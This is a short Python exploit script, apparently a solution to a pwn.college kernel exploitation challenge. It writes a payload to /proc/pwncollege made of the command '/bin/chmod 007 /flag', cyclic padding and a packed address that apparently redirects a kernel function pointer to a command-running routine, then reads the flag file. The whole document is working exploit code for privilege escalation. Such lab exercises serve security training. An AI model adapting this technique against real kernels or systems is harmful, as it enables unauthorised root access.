#!/bin/python

import os 
import sys
import fcntl
from pwn import * 

context.arch = 'amd64'

RUNCMD_ADDR = 0x089b30


payload  = b'/bin/chmod 007 /flag\x00'
payload += cyclic(0x100 - len(payload))
payload += pack(RUNCMD_ADDR + 0 * (32 ** 4), 24)

with open("/proc/pwncollege", 'wb') as f:
    f.write(payload)

time.sleep(0.5)
try:
    with open("/flag", 'r') as flag:
        print(flag.read())
except Exception as ex:
    print("Exception:: " + str(ex))


